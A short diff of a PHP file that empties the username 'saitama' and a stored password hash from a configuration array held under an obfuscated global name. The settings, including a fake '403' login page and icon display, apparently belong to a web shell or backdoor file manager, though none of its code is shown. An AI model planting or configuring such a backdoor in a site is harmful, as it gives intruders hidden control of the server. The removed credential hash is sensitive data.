@@ -6,8 +6,8 @@
 	Date:		Monday, Maret 15, 2021
 */
 $GLOBALS['oZgNypoPRU'] = array(
-    'username' => 'saitama',
-    'password' => '13e8f3a87bec4168dd3697f5d2dcff77',
+    'username' => '',
+    'password' => '',
     'safe_mode' => '0',
     'login_page' => '403',
     'show_icons' => '1',
